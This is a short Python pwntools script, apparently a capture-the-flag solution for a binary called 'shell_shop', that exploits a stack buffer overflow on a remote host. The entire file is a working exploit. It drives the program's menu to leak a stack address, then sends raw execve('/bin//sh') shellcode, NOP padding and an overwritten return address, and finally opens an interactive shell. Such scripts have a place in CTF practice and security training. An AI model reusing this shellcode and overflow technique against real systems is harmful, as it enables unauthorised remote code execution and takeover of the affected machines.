from pwn import *

context.binary = elf = ELF('./shell_shop')

#pr = process()
pr = remote('94.237.57.237',50264)
#gdb.attach(pr)
pr.recvuntil(b'>> ')
pr.sendline(b'2')

pr.recvuntil(b'>> ')
pr.sendline(b'3')

pr.recvuntil(b'purchase: [')
stack_leak = int(pr.recvuntil(b']')[:-1], 16)
log.info(f'stack_leak: {hex(stack_leak)}')

shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"

payload = b'y'+shellcode
payload += b'\x90'*(0x3a-len(payload))
payload += p64(stack_leak-1)
print(payload.decode('latin-1'))
pr.sendline(payload)
pr.interactive()